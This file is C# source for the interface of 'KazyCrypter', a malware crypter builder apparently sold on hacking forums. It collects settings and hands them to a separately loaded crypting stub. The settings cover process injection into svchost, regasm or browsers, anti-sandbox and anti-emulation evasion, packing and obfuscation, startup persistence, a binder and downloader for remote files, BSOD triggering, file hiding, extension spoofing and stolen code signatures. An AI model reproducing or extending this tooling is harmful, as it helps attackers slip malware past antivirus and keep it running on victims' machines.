﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;


namespace KazyCrypter
{
    public partial class CrypterForm : Form
    {
        Random r = new Random();
        Process resproc;

        [DllImport("user32.dll")]
        private static extern int HideCaret(IntPtr hwnd);

        public CrypterForm()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            InitializeControls();
            InitializeWorkDir();
            InitializeUtils();
        }

        private void InitializeControls()
        {
            toolStripStatusLabel1.Text += " " + ProductVersion;
            tabControlEX1.SelectedIndex = 0;
            tt.OwnerDraw = true;
            tt.Draw += ToolTip1_Draw;

            foreach (string i in Enum.GetNames(typeof(MessageBoxIcon)))
                comboBox1.Items.Add(i);
            comboBox1.SelectedIndex = 0;

            foreach (string i in Enum.GetNames(typeof(MessageBoxButtons)))
                comboBox2.Items.Add(i);
            comboBox2.SelectedIndex = 0;

            foreach (string i in Enum.GetNames(typeof(Environment.SpecialFolder)))
            {
                comboBox3.Items.Add(i);
                ToolStripMenuItem item = new ToolStripMenuItem(i);
                item.BackColor = Color.FromArgb(29, 36, 44);
                item.ForeColor = Color.White;
                item.Click += Item_Click;
                locationToolStripMenuItem.DropDownItems.Add(item);
            }
            comboBox3.SelectedIndex = 0;
            comboBox4.SelectedIndex = 0;

            richTextBox1.GotFocus += RichTextBox1_GotFocus;
        }

        private void RichTextBox1_GotFocus(object sender, EventArgs e)
        {
            HideCaret(richTextBox1.Handle);
        }

        private void Item_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in listView1.SelectedItems)
                i.SubItems[1].Text = ((ToolStripMenuItem)sender).Text;
        }

        private void InitializeUtils()
        {
            File.WriteAllBytes("res.exe", Properties.Resources.ResHacker);
            resproc = new Process();
            resproc.StartInfo.CreateNoWindow = true;
            resproc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            resproc.StartInfo.FileName = "res.exe";
        }

        private void ResProc(string args)
        {
            resproc.StartInfo.Arguments = args;
            resproc.Start();
            resproc.WaitForExit();
        }

        private Bitmap ExtractIcon(string path)
        {
            Bitmap bmp = null;
            File.Copy(path, "icon.exe", true);
            ResProc("-extract icon.exe, res.rc, ICONGROUP,,");
            if (File.Exists("Icon_1.ico"))
                bmp = (Bitmap)new Icon("Icon_1.ico").ToBitmap();

            return bmp;
        }

        private void InitializeWorkDir()
        {
            string workdir = Path.GetTempPath() + RandomString(r.Next(10, 20)) + "\\";
            try
            {
                if (Directory.Exists(workdir))
                    Directory.Delete(workdir, true);
                Directory.CreateDirectory(workdir);
                Directory.SetCurrentDirectory(workdir);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ToolTip1_Draw(object sender, DrawToolTipEventArgs e)
        {
            e.DrawBackground();
            e.DrawBorder();
            e.DrawText();
        }

        private string RandomString(int Length)
        {
            string chars = "qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM";
            string ret = "";
            for (int i = 0; i < Length; i++)
                ret += chars[r.Next(chars.Length)];
            return ret;
        }

        private void mysticTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            e.SuppressKeyPress = true;
        }

        private void mysticCheckBox1_CheckedChanged(object sender)
        {
            mysticGroupBox4.Text = "Injection Location - " + (mysticCheckBox1.Checked ? "Disabled" : "Enabled");
            mysticGroupBox4.Enabled = !mysticCheckBox1.Checked;
            mysticRadioButton2.Enabled = mysticRadioButton3.Enabled = mysticRadioButton4.Enabled = mysticRadioButton5.Enabled = mysticRadioButton6.Enabled = label2.Text.Contains("NO");
        }

        private void mysticRadioButton6_CheckedChanged(object sender)
        {
            mysticTextBox2.Enabled = mysticRadioButton6.Checked;
        }

        public static bool CheckIfDotNet(string path)
        {
            try
            {
                Assembly.Load(File.ReadAllBytes(path));
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool HasEOF(string path)
        {
            try
            {
                byte[] buffer = null;
                using (FileStream fs = new FileStream(path, FileMode.Open))
                {
                    buffer = new byte[4];
                    fs.Position = 0x3C;
                    fs.Read(buffer, 0, 4);
                    fs.Position = BitConverter.ToInt32(buffer, 0) + 0x6;
                    buffer = new byte[2];
                    fs.Read(buffer, 0, 2);
                    fs.Position += 0x100 + ((BitConverter.ToInt16(buffer, 0) - 1) * 0x28);
                    buffer = new byte[8];
                    fs.Read(buffer, 0, 8);
                    fs.Position = BitConverter.ToInt32(buffer, 0) + BitConverter.ToInt32(buffer, 4);
                    buffer = new byte[fs.Length - fs.Position];
                    fs.Read(buffer, 0, buffer.Length);
                }
                return buffer.Length != 0;
            }
            catch
            {
                return false;
            }
        }

        private void mysticButton1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                mysticTextBox1.Text = openFileDialog1.FileName;
                label1.Text = "Size: " + ((int)Math.Ceiling((double)File.ReadAllBytes(openFileDialog1.FileName).Length / 1024d)).ToString() + " KBs";
                if (CheckIfDotNet(openFileDialog1.FileName))
                {
                    label2.Text = ".Net: YES";
                    mysticCheckBox1.Enabled = true;
                    mysticRadioButton2.Enabled = mysticRadioButton3.Enabled = mysticRadioButton4.Enabled = mysticRadioButton5.Enabled = mysticRadioButton6.Enabled = false;
                    mysticRadioButton1.Checked = true;
                }
                else
                {
                    label2.Text = ".Net: NO";
                    mysticCheckBox1.Enabled = false;
                    mysticCheckBox1.Checked = false;
                }
                if (HasEOF(openFileDialog1.FileName))
                {
                    label3.Text = "EOF: YES";
                    mysticCheckBox1.Enabled = false;
                    mysticCheckBox1.Checked = false;
                    mysticRadioButton2.Enabled = mysticRadioButton3.Enabled = mysticRadioButton4.Enabled = mysticRadioButton5.Enabled = mysticRadioButton6.Enabled = false;
                    mysticRadioButton1.Checked = true;
                }
                else
                    label3.Text = "EOF: NO";
                Bitmap ico = ExtractIcon(mysticTextBox1.Text);
                if (ico != null)
                {
                    pictureBox1.Image = ico;
                    label5.Text = ((int)Math.Ceiling((double)File.ReadAllBytes("Icon_1.ico").Length / 1024d)).ToString() + " KBs";
                    File.Delete("Icon_1.ico");
                }
                else
                {
                    pictureBox1.Image = SystemIcons.Application.ToBitmap();
                    label5.Text = "0 KBs";
                }
            }
        }

        private void mysticCheckBox10_CheckedChanged(object sender)
        {
            mysticGroupBox2.Enabled = mysticCheckBox10.Checked;
        }

        private void mysticCheckBox11_CheckedChanged(object sender)
        {
            mysticGroupBox8.Enabled = mysticCheckBox11.Checked;
        }

        private void mysticButton2_Click(object sender, EventArgs e)
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                mysticTextBox3.Text = openFileDialog2.FileName;
                if (openFileDialog2.FileName.EndsWith(".ico"))
                {
                    pictureBox2.Image = new Icon(openFileDialog2.FileName).ToBitmap();
                    label6.Text = ((int)Math.Ceiling((double)File.ReadAllBytes(openFileDialog2.FileName).Length / 1024d)).ToString() + " KBs";
                }
                else
                {
                    Bitmap bmp = ExtractIcon(openFileDialog2.FileName);
                    if (bmp != null)
                    {
                        pictureBox2.Image = bmp;
                        label6.Text = ((int)Math.Ceiling((double)File.ReadAllBytes("Icon_1.ico").Length / 1024d)).ToString() + " KBs";
                        File.Delete("Icon_1.ico");
                    }
                    else
                    {
                        pictureBox2.Image = SystemIcons.Application.ToBitmap();
                        label6.Text = "0 KBs";
                    }
                }
            }
        }

        private void mysticButton3_Click(object sender, EventArgs e)
        {
            if (openFileDialog3.ShowDialog() == DialogResult.OK)
                mysticTextBox4.Text = openFileDialog3.FileName;
        }

        private void CrypterForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                string del = Directory.GetCurrentDirectory();
                Directory.SetCurrentDirectory(Path.GetTempPath());
                Directory.Delete(del, true);
            }
            catch (Exception) { }
        }

        private void mysticButton4_Click(object sender, EventArgs e)
        {
            MessageBox.Show(mysticTextBox6.Text, mysticTextBox5.Text, (MessageBoxButtons)Enum.GetValues(typeof(MessageBoxButtons)).GetValue(comboBox2.SelectedIndex), (MessageBoxIcon)Enum.GetValues(typeof(MessageBoxIcon)).GetValue(comboBox1.SelectedIndex));
        }

        private void mysticCheckBox12_CheckedChanged(object sender)
        {
            mysticGroupBox10.Enabled = mysticGroupBox11.Enabled = mysticGroupBox12.Enabled = mysticGroupBox13.Enabled = mysticButton4.Enabled = mysticRadioButton7.Enabled = mysticRadioButton8.Enabled = mysticCheckBox12.Checked;
        }

        private void mysticCheckBox14_CheckedChanged(object sender)
        {
            mysticGroupBox14.Enabled = mysticCheckBox14.Checked;
        }

        private void mysticCheckBox17_CheckedChanged(object sender)
        {
            mysticGroupBox17.Enabled = mysticCheckBox17.Checked;
        }

        private void mysticCheckBox18_CheckedChanged(object sender)
        {
            mysticGroupBox18.Enabled = mysticCheckBox18.Checked;
        }

        private void vScrollBar1_Scroll(object sender, ScrollEventArgs e)
        {
            titlebox.Text = RandomString(vScrollBar1.Value);
            productbox.Text = RandomString(vScrollBar1.Value);
            copyrightbox.Text = RandomString(vScrollBar1.Value);
            descriptionbox.Text = RandomString(vScrollBar1.Value);
            version1.Text = r.Next(100).ToString();
            version2.Text = r.Next(100).ToString();
            version3.Text = r.Next(100).ToString();
            version4.Text = r.Next(100).ToString();
            fversion1.Text = r.Next(100).ToString();
            fversion2.Text = r.Next(100).ToString();
            fversion3.Text = r.Next(100).ToString();
            fversion4.Text = r.Next(100).ToString();
        }

        private void addUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = new ListViewItem();
            item.SubItems[0].Text = InputField.GetInput("Enter the URL of your file!");
            item.SubItems.Add("CurrentFolder");
            item.SubItems.Add("Always");
            item.SubItems.Add("0");
            listView1.Items.Add(item);
        }

        private void addFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (openFileDialog4.ShowDialog() == DialogResult.OK)
            {
                ListViewItem item = new ListViewItem();
                item.SubItems[0].Text = openFileDialog4.FileName;
                item.SubItems.Add("CurrentFolder");
                item.SubItems.Add("Always");
                item.SubItems.Add("0");
                listView1.Items.Add(item);
            }
        }

        private void onceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in listView1.SelectedItems)
                i.SubItems[2].Text = "Once";
        }

        private void alwaysToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in listView1.SelectedItems)
                i.SubItems[2].Text = "Always";
        }

        private void neverToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in listView1.SelectedItems)
                i.SubItems[2].Text = "Never";
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string delay = InputField.GetInput("Enter the dealy in Secs!");
            foreach (ListViewItem i in listView1.SelectedItems)
                i.SubItems[3].Text = delay;
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            while (listView1.SelectedItems.Count != 0)
                listView1.Items.Remove(listView1.SelectedItems[0]);
        }

        private void removeAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }

        private void mysticCheckBox24_CheckedChanged(object sender)
        {
            mysticGroupBox22.Enabled = mysticCheckBox24.Checked;
        }

        private void mysticCheckBox27_CheckedChanged(object sender)
        {
            mysticGroupBox25.Enabled = mysticRadioButton9.Enabled = mysticRadioButton10.Enabled = mysticCheckBox27.Checked;
        }

        private void mysticCheckBox28_CheckedChanged(object sender)
        {
            mysticGroupBox26.Enabled = mysticCheckBox28.Checked;
        }

        private void mysticButton8_Click(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("http://hatscripts.com/addskype/?KazyProducts");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("http://www.hackforums.net/private.php?action=send&uid=199927");
        }

        private void mysticButton9_Click(object sender, EventArgs e)
        {

        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                Process.Start(linkLabel3.Text);
            }
            catch { }
        }

        private void mysticButton10_Click(object sender, EventArgs e)
        {

        }

        private void mysticButton11_Click(object sender, EventArgs e)
        {
            linkLabel3_LinkClicked(sender, null);
        }

        private void mysticButton12_Click(object sender, EventArgs e)
        {

        }

        struct _IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        };

        private DateTime GetBuildDateTime(byte[] assembly)
        {
            var buffer = new byte[Math.Max(Marshal.SizeOf(typeof(_IMAGE_FILE_HEADER)), 4)];
            using (var fileStream = new MemoryStream(assembly))
            {
                fileStream.Position = 0x3C;
                fileStream.Read(buffer, 0, 4);
                fileStream.Position = BitConverter.ToUInt32(buffer, 0); // COFF header offset
                fileStream.Read(buffer, 0, 4); // "PE\0\0"
                fileStream.Read(buffer, 0, buffer.Length);
            }
            var pinnedBuffer = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            try
            {
                var coffHeader = (_IMAGE_FILE_HEADER)Marshal.PtrToStructure(pinnedBuffer.AddrOfPinnedObject(), typeof(_IMAGE_FILE_HEADER));
                return TimeZone.CurrentTimeZone.ToLocalTime(new DateTime(1970, 1, 1) + new TimeSpan(coffHeader.TimeDateStamp * TimeSpan.TicksPerSecond));
            }
            finally
            {
                pinnedBuffer.Free();
            }
            return new DateTime();
        }

        private void mysticCheckBox29_CheckedChanged(object sender)
        {
            mysticGroupBox39.Enabled = mysticCheckBox29.Checked;
        }

        private void mysticButton14_Click(object sender, EventArgs e)
        {
            if (openFileDialog6.ShowDialog() == DialogResult.OK)
            {
                mysticTextBox18.Text = openFileDialog6.FileName;
                try
                {
                    label25.Text = "Version: " + Assembly.Load(File.ReadAllBytes(openFileDialog6.FileName)).GetName().Version.ToString();
                }
                catch
                {
                    label25.Text = "Version: N/A";
                }
            }
        }

        private void mysticButton7_Click(object sender, EventArgs e)
        {
            if (openFileDialog7.ShowDialog() == DialogResult.OK)
                mysticTextBox13.Text = openFileDialog7.FileName;
        }

        public void AddMessage(string text, bool error)
        {
            if (richTextBox1.Text != "")
                richTextBox1.AppendText(Environment.NewLine);
            richTextBox1.AppendText(text);
            if (error)
            {
                richTextBox1.Select(richTextBox1.Text.Length - text.Length, text.Length);
                richTextBox1.SelectionColor = Color.Red;
                richTextBox1.Select(richTextBox1.Text.Length - 1, 1);
            }
            richTextBox1.ScrollToCaret();
            richTextBox1.Invalidate();
            HideCaret(richTextBox1.Handle);
        }

        private void mysticButton13_Click(object sender, EventArgs e)
        {
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                new Thread(Build).Start();
        }

        private void Build()
        {
            try
            {
                richTextBox1.Clear();
                Assembly a;
                if (mysticCheckBox29.Checked)
                    try
                    {
                        AddMessage("Loading private stub: " + mysticTextBox18.Text, false);
                        a = Assembly.Load(File.ReadAllBytes(mysticTextBox18.Text));
                        AddMessage("Private stub loaded: " + a.GetName().Version.ToString() + Environment.NewLine, false);
                    }
                    catch
                    {
                        AddMessage("Couldn't load private stub!", true);
                        return;
                    }
                else
                {
                    AddMessage("Use private stub!", true);
                    return;
                }

                AddMessage("Extracting compiler tools...", false);
                File.WriteAllBytes("mt.exe", Properties.Resources.mt);
                File.WriteAllBytes("uac.manifest", Properties.Resources.uac);
                File.WriteAllBytes("upx.exe", Properties.Resources.upx);
                Directory.CreateDirectory("confuser");
                string[] confusername = new string[] { "Confuser.CLI.exe", "Confuser.Core.dll", "Confuser.DynCipher.dll", "Confuser.Protections.dll", "Confuser.Renamer.dll", "Confuser.Runtime.dll", "dnlib.dll", "System.Threading.dll" };
                foreach (string s in confusername)
                    File.WriteAllBytes("confuser\\" + s, (byte[])Properties.Resources.ResourceManager.GetObject(s.Replace(".exe", "").Replace(".dll", "").Replace(".", "_")));

                AddMessage("Collecting parameters for crypting...", false);
                CryptData data = new CryptData();
                data.Username = "";
                data.Form = this;
                data.MessageMethod = typeof(CrypterForm).GetMethod("AddMessage");
                data.TargetFile = saveFileDialog1.FileName;
                data.MainFile = mysticTextBox1.Text;
                data.ForceNet = mysticCheckBox1.Checked;
                if (mysticRadioButton1.Checked)
                    data.InjectLoc = "Itself";
                else if (mysticRadioButton2.Checked)
                    data.InjectLoc = "Vbc";
                else if (mysticRadioButton3.Checked)
                    data.InjectLoc = "Svchost";
                else if (mysticRadioButton4.Checked)
                    data.InjectLoc = "Regasm";
                else if (mysticRadioButton5.Checked)
                    data.InjectLoc = "Browser";
                else
                    data.InjectLoc = mysticTextBox2.Text;

                data.AntiSandboxie = mysticCheckBox2.Checked;
                data.AntiWS = mysticCheckBox4.Checked;
                data.AntiEmulation = mysticCheckBox3.Checked;
                data.AntiWPE = mysticCheckBox5.Checked;

                data.CompUSG = mysticCheckBox8.Checked;
                data.CompUPX = mysticCheckBox9.Checked;
                data.CompGzip = mysticCheckBox7.Checked;
                data.CompVer = mysticCheckBox6.Checked;

                data.ForceAdminManifest = mysticCheckBox13.Checked;

                data.IconChangerEnabled = mysticCheckBox10.Checked;
                data.IconPath = mysticTextBox3.Text;
                data.FileClonerEnabled = mysticCheckBox11.Checked;
                data.FileClonerPath = mysticTextBox4.Text;

                data.DefaultAssembly = mysticCheckBox19.Checked;
                data.AssTitle = titlebox.Text;
                data.AssProduct = productbox.Text;
                data.AssCopyright = copyrightbox.Text;
                data.AssDescription = descriptionbox.Text;
                data.AssVersion = version1.Text + "." + version2.Text + "." + version3.Text + "." + version4.Text;
                data.AssFileVersion = fversion1.Text + "." + fversion2.Text + "." + fversion3.Text + "." + fversion4.Text;

                data.MessageEnabled = mysticCheckBox12.Checked;
                data.MessageTitle = mysticTextBox5.Text;
                data.MessageText = mysticTextBox6.Text;
                data.MessageIconID = comboBox1.SelectedIndex;
                data.MessageButtonID = comboBox2.SelectedIndex;
                data.MessageAlways = mysticRadioButton8.Checked;

                data.StartupEnabled = mysticCheckBox14.Checked;
                data.StartupEntryName = mysticTextBox7.Text;
                data.StartupFileName = mysticTextBox8.Text;
                data.StartupLocation = comboBox3.SelectedItem.ToString();
                data.StartupMeltEnabled = mysticCheckBox15.Checked;

                data.DeleteZoneID = mysticCheckBox16.Checked;

                data.DelayEnabled = mysticCheckBox17.Checked;
                data.DelayAmount = mysticTextBox9.Text;

                data.PumperEnabled = mysticCheckBox18.Checked;
                data.PumperAmount = mysticTextBox10.Text;

                data.CMDArguments = mysticTextBox11.Text;

                string[][] bd = new string[listView1.Items.Count][];
                for (int i = 0; i < listView1.Items.Count; i++)
                {
                    bd[i] = new string[4];
                    for (int j = 0; j < 4; j++)
                        bd[i][j] = listView1.Items[i].SubItems[j].Text;
                }
                data.BinderDownloader = bd;

                data.ProcessPersistence = mysticCheckBox20.Checked;
                data.StartupPersistence = mysticCheckBox21.Checked;
                data.ElevatedProcess = mysticCheckBox22.Checked;
                data.BSOD = mysticCheckBox23.Checked;
                data.HideFile = mysticCheckBox25.Checked;
                data.HideFolder = mysticCheckBox26.Checked;

                data.CreationDateEnabled = mysticCheckBox28.Checked;
                data.CreationDateValue = dateTimePicker1.Value;

                data.ExtensionSpooferEnabled = mysticCheckBox24.Checked;
                data.ExtensionSpooferValue = mysticTextBox12.Text;

                data.SignatureStealerEnabled = mysticCheckBox27.Checked;
                data.SignatureStealerPath = mysticTextBox13.Text;
                data.SignatureX86 = mysticRadioButton9.Checked;

                data.DotNetVersion = comboBox4.SelectedItem.ToString();

                AddMessage("Parameters collected, crypting..." + Environment.NewLine, false);
                Stopwatch st = new Stopwatch();
                st.Start();
                bool ok = false;
                try
                {
                    ok = (bool)a.GetType("CryptEngine.CryptEngine").GetMethod("Crypt").Invoke(null, new object[] { data });
                }
                catch (Exception ex)
                {
                    AddMessage(Environment.NewLine + ex.InnerException.Message, true);
                }

                try
                {
                    Directory.Delete("confuser", true);
                    foreach (FileInfo f in new DirectoryInfo(Directory.GetCurrentDirectory()).GetFiles())
                        if (f.Name != "res.exe")
                            f.Delete();
                }
                catch { }

                st.Stop();
                if (ok)
                {
                    try
                    {
                        AddMessage(Environment.NewLine + "Successfully crypted!", false);
                        AddMessage(Environment.NewLine + "Operation took: " + new DateTime().AddMilliseconds(st.ElapsedMilliseconds).ToLongTimeString() + ":" + new DateTime().AddMilliseconds(st.ElapsedMilliseconds).Millisecond.ToString(), false);
                        AddMessage("Original Filesize: " + ((int)Math.Ceiling((double)File.ReadAllBytes(mysticTextBox1.Text).Length / 1024d)).ToString() + " KBs", false);
                        AddMessage("Crypted Filesize: " + ((int)Math.Ceiling((double)File.ReadAllBytes(saveFileDialog1.FileName).Length / 1024d)).ToString() + " KBs", false);
                        AddMessage("Filesize Change: " + Math.Round((double)File.ReadAllBytes(saveFileDialog1.FileName).Length / (double)File.ReadAllBytes(mysticTextBox1.Text).Length * 100, 2).ToString() + "%", false);
                    }
                    catch { }
                }
                else
                    AddMessage(Environment.NewLine + "Crypting was unsuccessful!", true);
            }
            catch (Exception ex)
            {
                AddMessage(ex.Message, true);
            }
        }

        private void mysticButton6_Click(object sender, EventArgs e)
        {
            if (saveFileDialog2.ShowDialog() == DialogResult.OK)
            {
                List<object> save = new List<object>();
                Control[] controls = new Control[] { tabPageEX1, tabPageEX2, tabPageEX3, tabPageEX4, tabPageEX6, tabPageEX10 };
                foreach (Control c in controls)
                    AddControlValues(ref save, c);
                FileStream st = File.Create(saveFileDialog2.FileName);
                new BinaryFormatter().Serialize(st, save);
                st.Close();
                MessageBox.Show("Your profile has been saved!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void AddControlValues(ref List<object> save, Control c)
        {
            foreach (Control cc in c.Controls)
                if (cc is MysticGroupBox)
                    AddControlValues(ref save, cc);
                else if (cc is MysticCheckBox)
                    save.Add((cc as MysticCheckBox).Checked);
                else if (cc is MysticRadioButton)
                    save.Add((cc as MysticRadioButton).Checked);
                else if (cc is Label)
                    save.Add((cc as Label).Text);
                else if (cc is MysticTextBox)
                    save.Add((cc as MysticTextBox).Text);
                else if (cc is PictureBox)
                    save.Add((cc as PictureBox).Image);
                else if (cc is VScrollBar)
                    save.Add((cc as VScrollBar).Value);
                else if (cc is DateTimePicker)
                    save.Add((cc as DateTimePicker).Value);
                else if (cc is ComboBox)
                    save.Add((cc as ComboBox).SelectedIndex);
                else if (cc is ListView)
                {
                    save.Add((cc as ListView).Items.Count);
                    foreach (ListViewItem item in (cc as ListView).Items)
                        for (int i = 0; i < 4; i++)
                            save.Add(item.SubItems[i].Text);
                }
        }

        private void mysticButton5_Click(object sender, EventArgs e)
        {
            if (openFileDialog8.ShowDialog() == DialogResult.OK)
            {
                List<object> save = (List<object>)new BinaryFormatter().Deserialize(new MemoryStream(File.ReadAllBytes(openFileDialog8.FileName)));
                Control[] controls = new Control[] { tabPageEX1, tabPageEX2, tabPageEX3, tabPageEX4, tabPageEX6, tabPageEX10 };
                foreach (Control c in controls)
                    LoadControlValues(ref save, c);
                MessageBox.Show("Your profile has been loaded!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void LoadControlValues(ref List<object> save, Control c)
        {
            foreach (Control cc in c.Controls)
                if (cc is MysticGroupBox)
                    LoadControlValues(ref save, cc);
                else if (cc is MysticCheckBox)
                {
                    (cc as MysticCheckBox).Checked = (bool)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is MysticRadioButton)
                {
                    (cc as MysticRadioButton).Checked = (bool)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is Label)
                {
                    (cc as Label).Text = (string)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is MysticTextBox)
                {
                    (cc as MysticTextBox).Text = (string)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is PictureBox)
                {
                    (cc as PictureBox).Image = (Bitmap)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is VScrollBar)
                {
                    (cc as VScrollBar).Value = (int)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is DateTimePicker)
                {
                    (cc as DateTimePicker).Value = (DateTime)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is ComboBox)
                {
                    (cc as ComboBox).SelectedIndex = (int)save[0];
                    save.RemoveAt(0);
                }
                else if (cc is ListView)
                {
                    int count = (int)save[0];
                    save.RemoveAt(0);
                    for (int j = 0; j < count; j++)
                    {
                        ListViewItem item = new ListViewItem();
                        item.SubItems[0].Text = (string)save[0];
                        save.RemoveAt(0);
                        for (int i = 1; i < 4; i++)
                        {
                            item.SubItems.Add((string)save[0]);
                            save.RemoveAt(0);
                        }
                        listView1.Items.Add(item);
                    }
                }
        }

        private void richTextBox1_MouseEnter(object sender, EventArgs e)
        {
            HideCaret(richTextBox1.Handle);
        }

        private void richTextBox1_MouseClick(object sender, MouseEventArgs e)
        {
            HideCaret(richTextBox1.Handle);
        }

        private void CrypterForm_Shown(object sender, EventArgs e)
        {

        }

        private void mysticCheckBox19_CheckedChanged(object sender)
        {
            mysticGroupBox20.Enabled = !mysticCheckBox19.Checked;
        }

        private void mysticTheme1_Click(object sender, EventArgs e)
        {

        }

        private void toolStripStatusLabel3_Click(object sender, EventArgs e)
        {

        }
    }

    public class CryptData
    {
        public string Username;
        public Form Form;
        public MethodInfo MessageMethod;

        public string MainFile;
        public string TargetFile;

        public bool ForceNet;
        public string InjectLoc;

        public bool AntiSandboxie;
        public bool AntiWS;
        public bool AntiEmulation;
        public bool AntiWPE;

        public bool CompUSG;
        public bool CompUPX;
        public bool CompGzip;
        public bool CompVer;

        public bool ForceAdminManifest;

        public bool IconChangerEnabled;
        public string IconPath;
        public bool FileClonerEnabled;
        public string FileClonerPath;

        public bool DefaultAssembly;
        public string AssTitle;
        public string AssProduct;
        public string AssCopyright;
        public string AssDescription;
        public string AssVersion;
        public string AssFileVersion;

        public bool MessageEnabled;
        public string MessageTitle;
        public string MessageText;
        public int MessageIconID;
        public int MessageButtonID;
        public bool MessageAlways;

        public bool StartupEnabled;
        public string StartupEntryName;
        public string StartupFileName;
        public string StartupLocation;
        public bool StartupMeltEnabled;

        public bool DeleteZoneID;

        public bool DelayEnabled;
        public string DelayAmount;

        public bool PumperEnabled;
        public string PumperAmount;

        public string CMDArguments;

        public string[][] BinderDownloader;

        public bool ProcessPersistence;
        public bool StartupPersistence;
        public bool ElevatedProcess;
        public bool BSOD;
        public bool HideFile;
        public bool HideFolder;

        public bool CreationDateEnabled;
        public DateTime CreationDateValue;

        public bool ExtensionSpooferEnabled;
        public string ExtensionSpooferValue;

        public bool SignatureStealerEnabled;
        public bool SignatureX86;
        public string SignatureStealerPath;

        public string DotNetVersion;
    }
}
